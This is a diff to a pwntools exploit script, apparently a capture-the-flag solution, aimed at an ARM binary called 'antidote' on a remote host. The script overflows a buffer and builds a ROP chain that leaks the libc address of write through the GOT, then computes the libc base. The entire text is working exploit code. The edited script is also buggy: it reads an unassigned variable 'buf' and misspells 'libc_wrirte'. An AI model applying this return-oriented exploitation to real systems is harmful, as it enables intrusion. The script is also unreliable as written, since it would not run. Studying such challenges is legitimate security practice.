@@ -33,18 +33,27 @@ from pwn import *
 
 context(arch='arm', bits=32, endian='little')
 context.log_level = "debug"
-'''
+
+elf = ELF('./antidote')
+libc = ELF('./libc.so.6')
+
 ip, port = '159.65.54.124', 30132
 io = remote(ip, port)
-'''
+#io = process(['qemu-arm', '-L','/usr/arm-linux-gnueabihf','./antidote'])
+
 payload = 'A'*220
 #write.plt(1, write.got, 4)
-payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(67664) + p32(0) + p32(1) + p32(0x000083cc) + p32(33824) + p32(0x000085f4)
+payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(elf.got['write']) + p32(0) + p32(1) + p32(0x000083cc) + p32(elf.sym['write']) + p32(0x000085f4)
 
-with open('input.txt','wb') as f:
-	f.write(payload)
-'''
+#with open('input.txt','wb') as f:
+#	f.write(payload)
+
 io.recvuntil('Careful there! That hurt!')
 io.sendline(payload)
-print io.recvall()
-'''
+io.recvline()
+#print buf
+libc_write = hex(u32(buf.strip().ljust(4,'\x00')))
+print 'write address: '+libc_write
+offset = int(libc_wrirte,16) - libc.sym['write']
+print 'libc base address: '+str(hex(offset))
+
